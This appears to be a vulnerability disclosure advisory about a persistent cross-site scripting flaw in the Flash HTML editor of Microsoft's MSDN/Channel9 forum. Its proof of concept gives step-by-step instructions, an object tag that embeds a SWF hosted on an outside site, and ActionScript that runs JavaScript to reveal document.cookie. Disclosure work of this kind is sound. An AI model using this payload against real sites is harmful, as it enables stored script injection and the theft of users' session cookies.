Introduction:
=============
The Microsoft Developer Network (MSDN) is the portion of Microsoft responsible for managing the firms 
relationship with developers and testers: hardware developers interested in the operating system (OS), 
developers standing on the various OS platforms, developers using the API and scripting languages of 
Microsoft s applications. The relationship management is situated in assorted media: web sites, 
newsletters, developer conferences, trade media, blogs and DVD distribution. The life cycle of the 
relationships ranges from legacy support through evangelizing potential offerings.

Severity:
=========
High


Details:
========
A persistent flash componente input validation vulnerability is detected on Microsofts MSDN Forum Service Application.
The vulnerability allows an attacker to implement malicious persistent comments when the user is editing or posting through Flash.
The vulnerability is located on the htmleditor input/output when processing to load manipualtes swf files which were created 
with flash action script.

Vulnerable Module(s):
                                                           [+] Comments & Edit - Flash Input/Output (Editor-HTML) [WebKit]

Picture(s):
                                                           ../1.png


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...

1) Either comment or start a new thread (http://channel9.msdn.com/forum).
2) Click on the html button, through which you can enter html source directly "HTML Source editor"
3) Paste the exploit code:


       <object type="application/x-shockwave-flash" data="http://www.subhohalder.com/xysecteam.swf" width="300" height="300">
           <param name="movie" value="http://www.subhohalder.com/xysecteam.swf" />
                 <param name="quality" value="high" />
                 <param name="scale" value="noscale" />
                 <param name="salign" value="LT" />
       <param name="allowScriptAccess" value="always" />
                 <param name="menu" value="false" />
            </object>


4) Click on update, and the document.cookie pop ups in alert

the vulnerable SWF is compiled from an ActionScript with the following code:


       class Main {

       static function main() {

       getURL('javascript:alert("VL Team "+document.cookie)');

       }    }


Reference(s):
                                                           ../poc1.zip


Risk:
=====
The security risk of the persistent input/output valiation vulnerability is estimated as high(+).
